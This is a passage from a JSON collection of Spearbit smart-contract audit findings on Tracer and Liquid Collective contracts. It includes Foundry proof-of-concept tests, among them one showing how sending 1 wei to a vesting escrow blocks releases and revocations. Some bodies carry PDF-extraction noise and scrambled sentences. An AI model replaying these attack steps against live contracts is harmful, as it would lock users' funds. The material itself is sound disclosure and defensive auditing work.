) public pure returns (uint256) { ... In ERC20_Cloneable.sol#L46-L49 a comment at the constructor of contract ERC20_Cloneable mentions a default value of 18 for decimals. However, it doesnt use this default value, but the supplied parameter. Moreover, a comment at the constructor of ERC20_Cloneable contract mentions _setupDecimals. This is probably a reference to an old version of the OpenZeppelin ERC20 contracts, and no longer relevant. Additionally, the comments say the values are immutable, but they are set in the initialize() function. 48 @dev Sets the values for {name} and {symbol}, initializes {decimals} with * a default value of 18. * To select a different value for {decimals}, use {_setupDecimals}. * * construction. All three of these values are immutable: they can only be set once during ... constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) { _decimals = decimals_; } function initialize(address _pool, string memory name_, string memory symbol_, uint8 decimals_) ,! external initializer { owner = _pool; _name = name_; _symbol = symbol_; _decimals = decimals_; }",
        "labels": [
            "Spearbit",
            "Tracer",
            "Severity: Informational"
        ]
    },
    {
        "title": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unsolicited exits can happen at the end of _setStoppedValidatorCounts(...)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
        "body": "Calculation of CurrentValidatorExitsDemand and TotalValidatorExitsRequested using unso- licited exits can happen at the end of _setStoppedValidatorCounts(...) to avoid extra operations like taking minimum per iteration of the loops. Note that: an = an(cid:0)1 (cid:0) min(an(cid:0)1, bn) ) an = a0 (cid:0) min(a0, n X i=1 bn) = max(0, a0 (cid:0) n X i=1 bn)",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "use _setCurrentValidatorExitsDemand",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
        "body": "If an update is needed for CurrentValidatorExitsDemand in _setStoppedValidatorCounts(...), the internal function _setCurrentValidatorExitsDemand is not used.",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "Changes to the emission of RequestedValidatorExits event during catch-up",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollectivePR-Spearbit-Security-Review.pdf",
        "body": "The event log will be different between the old and new implementations. In the old implementation, the latest RequestedValidatorExits event in the logs will always contain the most up-to-date count of requested exits (count) of an operator after a \"catch-up\" attempt. This is because a new RequestedValidatorExits event with the up-to-date currentStoppedCount is emitted at the end of the async requestValidatorExits function call. However, in the new implementation, the latest RequestedValidatorExits event in the logs contains the outdated or previous count of an operator after a \"catch-up\" attempt since a new RequestedValidatorExits event is not emitted at the end of the Oracle reporting transaction. If any off-chain component depends on the latest RequestedValidatorExits event in the logs to determine the count of requested exits (count), it might potentially cause the off-chain component to read and process outdated information. For instance, an operator's off-chain component might be reading the count within the latest Request- edValidatorExits event in the logs and comparing it against its internal counter to decide if more validators need to be exited. The following shows the discrepancy between the events emitted between the old and new implementations. Catch-up implementation in the previous design 1) Catch-up was carried out async when someone called the requestValidatorExits > _pickNextValida- torsToExitFromActiveOperators function 2) Within the _pickNextValidatorsToExitFromActiveOperators function. Assume an operator called opera It will attempt to \"catch-up\" by and its currentRequestedExits is less than the currentStoppedCount. performing the following actions: 1) Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2) Let x be the no. of validator count to \"catch-up\" (x = currentStoppedCount (cid:0) currentRequestedExits) 3) opera.picked will be incremented by x. Since opera.picked has not been initialized yet, opera.picked = x 3) Assume that the opera is neither the operator with the highest validation count nor the operator with the second highest. As such, opera is not \"picked\" to exit its validators 5 4) Near the end of the _pickNextValidatorsToExitFromActiveOperators function, it will loop through all op- erators that have operator .picked > 0 and perform some actions. The following actions will be performed against opera since opera.picked > 0: 1) Emit RequestedValidatorExits(opera, currentStoppedCount) event 2) Set opera.requestedExits = currentStoppedCount. 5) After the transaction, two events were emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount)  RequestedValidatorExits(opera, currentStoppedCount) Catch-up implementation in the new design 1. Catch-up was carried out within the _setStoppedValidatorCounts function during Oracle reporting. 2. Let _stoppedValidatorCounts[idx] be the currentStoppedCount AND operators.requestedExits be currentRequestedExits 3. Assume an operator called opera and its currentRequestedExits is less than the currentStoppedCount. It will attempt to \"catch-up\" by performing the following actions: 1. Emit UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) event. 2. Set opera.requestedExits = currentStoppedCount. 4. After the transaction, only one event was emitted for opera to indicate a catch-up had been attempted.  UpdatedRequestedValidatorExitsUponStopped(opera, currentRequestedExits, currentStoppedCount) In addition, as per the comment below, it was understood that unsolicited exits are considered as if exit requests were performed for them. In this case, the latest RequestedValidatorExits event in the logs should reflect the most up-to-date count of exit requests for an operator including unsolicited exits at any time. File: OperatorsRegistry.1.sol 573: ,! 574: ,! were performed for them vars.currentValidatorExitsDemand); // we decrease the demand, considering unsollicited exits as if the exit requests vars.currentValidatorExitsDemand -= LibUint256.min(unsollicitedExits,",
        "labels": [
            "Spearbit",
            "LiquidCollectivePR",
            "Severity: Informational"
        ]
    },
    {
        "title": "A malicious user could DOS a vesting schedule by sending only 1 wei of TLC to the vesting escrow address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending just 1 wei of TLC to the escrow address related to the vesting schedule. By doing that:  The creator of the vesting schedule will not be able to revoke the vesting schedule.  The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the vesting schedule.  Any external contracts or dApps will not be able to call computeVestingReleasableAmount . In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un- derflow error when called before the vesting schedule ends. The underflow error leasableAmount will enter uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) - balanceOf(_escrow); is thrown because, when called before the schedule ends, _computeVestingRe- try to compute the if (_time < _vestingSchedule.end) branch and will In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than balanceOf(_escrow) and the contract will revert with an underflow error. When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the malicious user. Scenario: 1) Bob owns 1 TLC token. 2) Alluvial creates a vesting schedule for Alice like the following example: createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); 3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule. 8 4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is 11 it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10. Find below a test case showing all three different DOS scenarios: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDOSReleaseVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice 9 vm.prank(bob); tlc.transfer(aliceEscrow, 1); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); // The transaction will revert for UNDERFLOW because now the balance of the escrow has been ,! increased externally vm.expectRevert(stdError.arithmeticError); tlc.releaseVestingSchedule(0); // Warp at the vesting schedule period end vm.warp(block.timestamp + 9 days); // Alice is able to get the whole vesting schedule amount // plus the token sent by the attacker to the escrow contract vm.prank(alice); tlc.releaseVestingSchedule(0); assertEq(tlc.balanceOf(alice), 11); } function testDOSRevokeVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); // The creator decide to revoke the vesting schedule before the end timestamp // It will throw an underflow error vm.prank(initAccount); vm.expectRevert(stdError.arithmeticError); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1)); } function testDOSComputeVestingReleasableAmount() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice 10 vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); vm.expectRevert(stdError.arithmeticError); uint256 releasableAmount = tlc.computeVestingReleasableAmount(0); // Warp to the end of the vesting schedule vm.warp(block.timestamp + 10 days); releasableAmount = tlc.computeVestingReleasableAmount(0); assertEq(releasableAmount, 11); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } 11 }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Coverage funds might be pulled not only for the purpose of covering slashing losses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The newly introduced coverage fund is a smart contract that holds ETH to cover a potential lsETH price decrease due to unexpected slashing events. Funds might be pulled from CoverageFundV1 to the River contract through setConsensusLayerData to cover the losses and keep the share price stable In practice, however, it is possible that these funds will be pulled not only in emergency events. _maxIncrease is used as a measure to enforce the maximum difference between prevTotalEth and postTotalEth, but in practice, it is being used as a mandatory growth factor in the context of coverage funds, which might cause the pulling of funds from the coverage fund to ensure _maxIncrease of revenue in case fees are not high enough.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Consider preventing CoverageFundAddress to be set as address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of River.setCoverageFund and CoverageFundAddress.set both func- tion do not revert when the _newCoverageFund address parameter is equal to address(0). If the Coverage Fund address is empty, the River._pullCoverageFunds function will return earlier and will not pull any coverage fund.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "CoverageFund.initCoverageFundV1 might be front-runnable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Upgradeable contracts are used in the project, mostly relying on a TUPProxy contract. Initializing a contract is a 2 phase process where the first call is the actual deployment and the second call is a call to the init function itself. From our experience with the repository, the upgradeable contracts deployment scripts are using the TUPProxy correctly, however in that case we were not able to find the deployment script for CoverFund, so we decided to raise this point to make sure you are following the previous policy also for this contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Account owner of the minted TLC tokens must call delegate to own vote power of initial minted tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "ken.delegate(accountOwner) to auto-delegate to itself, otherwise it will have zero voting power. the minted TLC tokens must The _account owner of remember to call tlcTo- Without doing that anyone (even with just 1 voting power) could make any proposal pass and in the future manage the DAO proposing, rejecting or accepting/executing proposals. As the OpenZeppelin ERC20 documentation says: By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Consider using unchecked block to save some gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Because of the if statement, it is impossible for vestedAmount - releasedAmount to underflow, thus allowing the usage of the unchecked block to save a bit of gas.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "createVestingSchedule allows the creation of a vesting schedule that could release zero tokens after a period has passed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Depending on the value of duration or amount it is possible to create a vesting schedule that would release zero token after a whole period has elapsed. This is an edge case scenario but would still be possible given that createVestingSchedule can be called by anyone and not only Alluvial. See the following test case for an example //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDistributeZeroPerPeriod() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, duration: 365 days, period: 1 days, amount: 100, beneficiary: alice, delegatee: address(0), 15 revocable: true }) ); // One whole period pass and alice check how many tokens she can release vm.warp(block.timestamp + 1 days); uint256 releasable = tlc.computeVestingReleasableAmount(0); assertEq(releasable, 0); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "CoverageFund - Checks-Effects-Interactions best practice is violated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "We were not able to find any concrete instances of harmful reentrancy attack vectors in this contract, but it's recommended to follow the Checks-effects-interactions pattern anyway.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "River contract allows setting an empty metadata URI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of River.setMetadataURI and MetadataURI.set both allow the current value of the metadata URI to be updated to an empty string.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider requiring that the _cliffDuration is a multiple of _period",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "When a vesting schedule is created via _createVestingSchedule, the only check made on _period parameter (other than being greater than zero) is that the _duration must be a multiple of _period. If after the _cliffDuration the user can already release the matured vested tokens, it could make sense to also require that _cliffDuration % _period == 0",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add documentation about the scenario where a vesting schedule can be created in the past",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "In the current implementation of ERC20VestableVotesUpgradeable _createVestingSchedule func- tion, there is no check for the _start value. This means that the creator of a vesting schedule could create a schedule that starts in the past. Allowing the creation of a vesting schedule with a past _start also influences the behavior of _revokeVestingSchedule (see ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked).",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The current implementation of _createVestingSchedule allows the creation of vesting schedules that  Start in the past: _start < block.timestamp.  Have already ended: _start + _duration < block.timestamp. Because of this behavior, in case of the creation of a past vesting schedule that has already ended  The _beneficiary can instantly call (if there's no lock period) releaseVestingSchedule to release the whole amount of tokens.  The creator of the vesting schedule cannot call revokeVestingSchedule because the new end would be in the past and the transaction would revert with an InvalidRevokedVestingScheduleEnd error. The second scenario is particularly important because it does not allow the creator to reduce the length or remove the schedule entirely in case the schedule has been created mistakenly or with a misconfiguration (too many token vested, lock period too long, etc...).",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "getVestingSchedule returns misleading information if the vesting token creator revokes the sched- ule",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The getVestingSchedule function returns the information about the created vesting schedule. The duration represents the number of seconds of the vesting period and the amount represents the number of tokens that have been scheduled to be released after the period end (or after lockDuration if it has been configured to be greater than end). If the creator of the vesting schedule calls revokeVestingSchedule, only the end of the vesting schedule struct will be updated. If external contracts or dApps rely only on the getVestingSchedule information there could be scenarios where they display or base their logic on wrong information. Consider the following example. Alluvial creates a vesting schedule for alice with the following config 18 { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true This means that after 10 days, Alice would own in her balance 10 TLC tokens. If Alluvial calls revokeVestingSchedule before the cliff period ends, all of the tokens will be returned to Alluvial but the getVestingSchedule function would still display the same information with just the end attribute updated. An external dApp or contract that does not check the new end and compares it to cliffDuration, lockDura- tion, and period but only uses the amount would display the wrong number of vested tokens for Alice at a given timestamp.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule. This function returns the value returned by _computeVestedAmount that relies on duration and amount while the only attribute changed by revokeVestingSchedule is the end. 19 function _computeVestedAmount(VestingSchedules.VestingSchedule memory _vestingSchedule, uint256 _time) internal pure returns (uint256) { if (_time < _vestingSchedule.start + _vestingSchedule.cliffDuration) { // pre-cliff no tokens have been vested return 0; } else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) { // post vesting all tokens have been vested return _vestingSchedule.amount; } else { uint256 timeFromStart = _time - _vestingSchedule.start; // compute tokens vested for completly elapsed periods uint256 vestedDuration = timeFromStart - (timeFromStart % _vestingSchedule.period); return (vestedDuration * _vestingSchedule.amount) / _vestingSchedule.duration; } } If the creator revokes the schedule, the computeVestingVestedAmount would return more tokens compared to the amount that the user has vested in reality. Consider the following example. Alluvial creates a vesting schedule with the following config { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true Alluvial then calls revokeVestingSchedule(0, uint64(block.timestamp + 5 days));. The effect of this trans- action would return 5 tokens to Alluvial and set the new end to block.timestamp + 5 days. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + 7 days), it would return 7 because _computeVestedAmount would execute the code in the else branch. But alice cannot have more than 5 vested tokens because of the previous revoke. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + duration)it would return 10 because _computeVestedAmount would execute the code in the else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) branch. But alice cannot have more than 5 vested tokens because of the previous revoke. Attached test below to reproduce it: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { 20 function __computeVestingReleasableAmount(uint256 vestingID, uint256 _time) external view returns (uint256) { ,! return _computeVestingReleasableAmount( VestingSchedules.get(vestingID), _deterministicVestingEscrow(vestingID), _time ); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal creator; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); creator = makeAddr(\"creator\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testIncorrectComputeVestingVestedAmount() public { vm.prank(initAccount); tlc.transfer(creator, 10); // create a vesting schedule for Alice vm.prank(creator); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); // creator call revokeVestingSchedule revoking the vested schedule setting the new end as half ,! of the duration // 5 tokens are returned to the creator and `end` is updated to the new value // this means also that at max alice will have 5 token vested (and releasable) vm.prank(creator); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 5 days)); // We warp at day 7 of the schedule vm.warp(block.timestamp + 7 days); 21 // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 7); // We warp at day 10 (we reached the total duration of the vesting) vm.warp(block.timestamp + 3 days); // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 10); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider writing clear documentation on how the voting power and delegation works",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "ERC20VotesUpgradeable contract. As the official OpenZeppelin documentation says (also reported in the Alluvial's natspec contract): ERC20VestableVotesUpgradeableV1 extension The an of is By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. Because of how ERC20VotesUpgradeable behaves on voting power and delegation of voting power could be coun- terintuitive for normal users who are not aware of it, Alluvial should be very explicit on how users should act when a vesting schedule is created for them. When a Vote Token is transferred, ERC20VotesUpgradeable calls the hook _afterTokenTransfer function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._afterTokenTransfer(from, to, amount); _moveVotingPower(delegates(from), delegates(to), amount); } In this case, _moveVotingPower(delegates(from), delegates(to), amount); will decrease the voting power of delegates(from) by amount and will increase the voting power of delegates(to) by amount. This applies if some conditions are true, but you can see them here function _moveVotingPower( address src, address dst, uint256 amount ) private { if (src != dst && amount > 0) { if (src != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[src], _subtract, ,! amount); emit DelegateVotesChanged(src, oldWeight, newWeight); } if (dst != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[dst], _add, amount); emit DelegateVotesChanged(dst, oldWeight, newWeight); } } } When a vesting schedule is created, the creator has two options: 1) Specify a custom delegatee different from the beneficiary (or equal to it, but it's the same as option 2). 2) Leave the delegatee empty (equal to address(0)).  Scenario 1) empty delegatee OR delegatee === beneficiary (same thing) After creating the vesting schedule, the voting power of the beneficiary will be equal to the amount of tokens vested. If the beneficiary did not call tlc.delegate(beneficiary) previously, after releasing some tokens, its voting power will be decreased by the amount of released tokens. 23  Scenario 2) delegatee !== beneficiary && delegatee !== address(0) Same thing as before, but now we have two different actors, one is the beneficiary and another one is the delegatee of the voting power of the vested tokens. If the beneficiary did not call tlc.delegate(vestingScheduleDelegatee) previously, after releasing some to- kens, the voting power of the current vested schedule's delegatee will be decreased by the amount of released tokens.  Related test for scenario 1 //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testLosingPowerAfterRelease() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: false }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); assertEq(tlc.getVotes(alice), 10); 24 assertEq(tlc.balanceOf(alice), 0); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); tlc.releaseVestingSchedule(0); // Alice now owns the vested tokens just released but her voting power has decreased by the ,! amount released assertEq(tlc.getVotes(alice), 9); assertEq(tlc.balanceOf(alice), 1); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fix mismatch between revert error message and code behavior",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "The error message requires the schedule duration to be greater than the cliff duration, but the code allows it to be greater than or equal to the cliff duration.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve documentation and naming of period variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Similar to Consider renaming period to periodDuration to be more descriptive, the variable name and documentation are ambiguous. We can give a more descriptive name to the variable and fix the documenta- tion.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming period to periodDuration to be more descriptive",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "period can be confused as (for example) a counter or an id.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider removing coverageFunds variable and explicitly initialize executionLayerFees to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
        "body": "Inside the OracleManager.setConsensusLayerData the coverageFunds variable is declared but never used. Consider cleaning the code by removing the unused variable. The executionLayerFees variable instead should be explicitly initialized to zero to not rely on compiler assump- tions.",
        "labels": [
            "Spearbit",
            "LiquidCollective2",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming IVestingScheduleManagerV1 interface to IERC20VestableVotesUpgradeableV1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf",
